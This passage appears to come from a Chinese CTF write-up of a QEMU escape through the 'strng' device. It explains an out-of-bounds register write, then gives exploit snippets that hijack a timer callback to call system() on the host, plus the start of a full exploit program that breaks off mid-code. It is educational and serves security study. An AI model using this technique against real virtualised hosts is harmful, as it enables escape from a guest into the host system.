<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_init_tl</span><span class="params">(QEMUTimer *ts,</span></span><br><span class="line"><span class="params">                   QEMUTimerList *timer_list, <span class="type">int</span> scale,</span></span><br><span class="line"><span class="params">                   QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    ts-&gt;timer_list = timer_list;</span><br><span class="line">    ts-&gt;cb = cb;</span><br><span class="line">    ts-&gt;opaque = opaque;</span><br><span class="line">    ts-&gt;scale = scale;</span><br><span class="line">    ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从前面的调试结果可以看到 <code>STRNGState.flag</code> 初始值为 0 ，但是在 <code>strng_mmio_write</code> 函数中如果 <code>index</code> 不为 0 则会设置 <code>s-&gt;flag = 1</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* --- MMIO: 0x100 bytes, direct indexed by offset/4 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *s = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> seed = (<span class="type">uint32_t</span>)val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">4</span> &amp;&amp; ((addr &amp; <span class="number">3</span>) == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> index = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">1</span>) &#123;</span><br><span class="line">            s-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">3</span>) &#123;</span><br><span class="line">                s-&gt;regs[<span class="number">3</span>] = rand_r(&amp;s-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">/* direct write (within MMIO region size, so index in [0..63]) */</span></span><br><span class="line">            s-&gt;regs[index] = seed;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* index == 0 */</span></span><br><span class="line">            srand((<span class="type">unsigned</span>)val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* invalid size or unaligned: ignored */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而在 <code>strng_pmio_write</code> 函数中如果如果 <code>opaque-&gt;flag</code> 非零会执行如下代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* OOB write preserved: no check that index &lt; 64 */</span></span><br><span class="line">s-&gt;regs[index] = (<span class="type">uint32_t</span>)val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flag) &#123;</span><br><span class="line">    <span class="type">int64_t</span> now = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">    timer_mod(&amp;s-&gt;strng_timer, now + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>timer_mod</code> 函数有如下调用栈：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#C4A000">timer_mod_ns_locked</font> (<font color="#06989A">timer_list</font>=0x5555574dedd0, <font color="#06989A">ts</font>=0x55555755c7d8, <font color="#06989A">expire_time</font>=38581000000) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:388
#1  <font color="#3465A4">0x00005555559c4458</font> in <font color="#C4A000">timer_mod_ns</font> (<font color="#06989A">ts</font>=0x55555755c7d8, <font color="#06989A">expire_time</font>=38581000000) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:424
#2  <font color="#3465A4">0x00005555559c455b</font> in <font color="#C4A000">timer_mod</font> (<font color="#06989A">ts</font>=0x55555755c7d8, <font color="#06989A">expire_time</font>=38581) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:458
#3  <font color="#3465A4">0x000055555569af88</font> in <font color="#C4A000">strng_pmio_write</font> (<font color="#06989A">opaque</font>=0x55555755bbe0, <font color="#06989A">addr</font>=4, <font color="#06989A">val</font>=1465239272, <font color="#06989A">size</font>=4) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/hw/misc/strng.c</font>:132</pre>

<p>其中 <code>timer_mod_ns_locked</code> 函数定义如下，也就是说这里会将该定时任务时间 <code>expire_time</code> 设置为 <code>now + 100</code> ，并且将 <code>opaque-&gt;strng_timer</code> 添加到定时任务。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在“已加锁”的上下文中，把定时器 ts 按到期时间（纳秒）插入到 timer_list 的有序链表里。</span></span><br><span class="line"><span class="comment">// 要点：</span></span><br><span class="line"><span class="comment">// 1) active_timers 是一个“头指针”（指向链表第一个 QEMUTimer*），不是哨兵节点对象。</span></span><br><span class="line"><span class="comment">// 2) 链表按 expire_time 递增排序（越早触发的定时器越靠前）。</span></span><br><span class="line"><span class="comment">// 3) 与已有相同到期时间的定时器相比，新的 ts 会插入在它们“后面”（保持相等时间的稳定顺序）。</span></span><br><span class="line"><span class="comment">// 4) 返回值表示：ts 是否被插在了链表最前面（需要重置硬件/宿主的下一次唤醒）。</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">timer_mod_ns_locked</span><span class="params">(QEMUTimerList *timer_list,</span></span><br><span class="line"><span class="params">                                QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUTimer **pt, *t;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 从链表“头指针”的地址开始。pt 是“指向当前节点指针的指针”，</span></span><br><span class="line"><span class="comment">       这是典型的“指针的指针”插入技巧，便于在单链表里做前插/替换。 */</span></span><br><span class="line">    pt = &amp;timer_list-&gt;active_timers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        t = *pt;  <span class="comment">// t 是当前节点</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// timer_expired_ns(t, expire_time) 一般等价于：</span></span><br><span class="line">        <span class="comment">//   (t != NULL) &amp;&amp; (t-&gt;expire_time &lt;= expire_time)</span></span><br><span class="line">        <span class="comment">// 也就是：当前节点 t 的到期时间是否“早于或等于”新定时器的到期时间。</span></span><br><span class="line">        <span class="comment">// 如果“不是”（返回 false），说明我们找到了第一个“比新定时器更晚”的位置，应该在这里插入。</span></span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(t, expire_time)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 否则（当前 t 的触发时间 &lt;= 新定时器的时间），就继续向后找插入点，</span></span><br><span class="line">        <span class="comment">// 并把 pt 前移到“下一个指针的地址”（&amp;t-&gt;next）。</span></span><br><span class="line">        pt = &amp;t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 规范化到期时间：小于 0 的时间戳被钳为 0（立即触发的语义）。</span></span><br><span class="line">    ts-&gt;expire_time = MAX(expire_time, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 经典的前插法：把 ts 接在 *pt 之前。</span></span><br><span class="line">    ts-&gt;next = *pt;  <span class="comment">// 新节点的 next 指向当前位置的旧节点</span></span><br><span class="line">    *pt = ts;        <span class="comment">// 然后让“前驱的 next”改指向新节点（或链表头指向新节点）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值：如果插入点就是“链表头指针”，说明 ts 成为了“最早到期”的定时器。</span></span><br><span class="line">    <span class="comment">// 上层据此通常会“重置/重编程”宿主定时器或事件源（因为最近的触发时间变了）。</span></span><br><span class="line">    <span class="keyword">return</span> pt == &amp;timer_list-&gt;active_timers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此不难想到可以修改 <code>opaque-&gt;strng_timer</code> 的 <code>cb</code> 为 <code>system@plt</code> 然后将 <code>opaque-&gt;strng_timer</code> 的 <code>opaque</code> 指向参数地址，从而实现任意命令执行。不过需要注意在修改上述位置之后，需要调用 <code>timer_mod</code> 才能触发。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ab_write(<span class="number">0x110</span>, system_plt);</span><br><span class="line">ab_write(<span class="number">0x118</span>, STRNGState_addr + <span class="number">0xaf8</span> + <span class="number">0x14</span>);</span><br><span class="line"></span><br><span class="line">mmio_write32(<span class="number">2</span> &lt;&lt; <span class="number">2</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// opaque-&gt;flag = 1;</span></span><br><span class="line">pio_write32(<span class="number">0</span>, <span class="number">2</span> &lt;&lt; <span class="number">2</span>); <span class="comment">// opaque-&gt;addr &gt;&gt; 2 != 0</span></span><br><span class="line">pio_write32(<span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// timer_mod(&amp;s-&gt;strng_timer, now + 100);</span></span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#C4A000">__libc_system</font> (<font color="#06989A">line</font>=0x555558d0e37c &quot;/usr/bin/gnome-calculator&quot;) at <font color="#4E9A06">../sysdeps/posix/system.c</font>:198
#1  <font color="#3465A4">0x00005555559c473d</font> in <font color="#C4A000">timerlist_run_timers</font> (<font color="#06989A">timer_list</font>=0x5555574dedd0) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:528
#2  <font color="#3465A4">0x00005555559c4786</font> in <font color="#C4A000">qemu_clock_run_timers</font> (<font color="#06989A">type</font>=QEMU_CLOCK_VIRTUAL) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:539
#3  <font color="#3465A4">0x00005555559c4b1f</font> in <font color="#C4A000">qemu_clock_run_all_timers</font> () at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/qemu-timer.c</font>:653
#4  <font color="#3465A4">0x00005555559c36c8</font> in <font color="#C4A000">main_loop_wait</font> (<font color="#06989A">nonblocking</font>=0) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/main-loop.c</font>:516
#5  <font color="#3465A4">0x000055555578a2ef</font> in <font color="#C4A000">main_loop</font> () at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/vl.c</font>:1966
#6  <font color="#3465A4">0x0000555555791821</font> in <font color="#C4A000">main</font> (<font color="#06989A">argc</font>=19, <font color="#06989A">argv</font>=0x7fffffffde98, <font color="#06989A">envp</font>=0x7fffffffdf38) at <font color="#4E9A06">/home/w0lfzhang/Desktop/qemu-2.8.1.1/vl.c</font>:4684
#7  <font color="#3465A4">0x00007ffff7a62083</font> in <font color="#C4A000">__libc_start_main</font> (<font color="#06989A">main</font>=0x55555578d901 &lt;main&gt;, <font color="#06989A">argc</font>=19, <font color="#06989A">argv</font>=0x7fffffffde98, <font color="#06989A">init</font>=&lt;optimized out&gt;, <font color="#06989A">fini</font>=&lt;optimized out&gt;, <font color="#06989A">rtld_fini</font>=&lt;optimized out&gt;, <font color="#06989A">stack_end</font>=0x7fffffffde88) at <font color="#4E9A06">../csu/libc-start.c</font>:308
#8  <font color="#3465A4">0x0000555555601a69</font> in <font color="#C4A000">_start</font> ()</pre>

<h2 id="完整-Exp"><a href="#完整-Exp" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_IO 0x00000100ULL  <span class="comment">// 与内核 ioport 标志一致</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> base;        <span class="comment">// 端口基址 (x86 的 I/O 空间是 16-bit)</span></span><br><span class="line">    <span class="type">uint32_t</span> size;        <span class="comment">// BAR 大小（字节）</span></span><br><span class="line">    <span class="type">uint16_t</span> grant_base;  <span class="comment">// 实际通过 ioperm 开放的起始端口</span></span><br><span class="line">    <span class="type">uint32_t</span> grant_len;   <span class="comment">// 实际开放长度</span></span><br><span class="line">    <span class="type">bool</span>     have_ioperm;</span><br><span class="line">    <span class="type">bool</span>     have_iopl;</span><br><span class="line">    <span class="type">bool</span>     inited;</span><br><span class="line">&#125; <span class="type">pio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pio_ctx_t</span> g_pio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：从 /sys/bus/pci/devices/&lt;BDF&gt;/resource 解析出指定 BAR（或自动挑首个 PIO BAR）的 start/end/flags */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_io_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bdf_or_path, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                        <span class="type">uint16_t</span> *out_base, <span class="type">uint32_t</span> *out_size)</span> &#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 可直接传 resource 文件全路径</span></span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>   idx = <span class="number">0</span>, chosen = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>  line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;start, &amp;end, &amp;flags) != <span class="number">3</span>) &#123; idx++; <span class="keyword">continue</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(flags &amp; IORESOURCE_IO)) &#123; fclose(fp); errno = EINVAL; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL) &#123; fclose(fp); errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (flags &amp; IORESOURCE_IO)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL) &#123; fclose(fp); errno = ERANGE; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx; <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (chosen &lt; <span class="number">0</span>) &#123; errno = ENOENT; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span 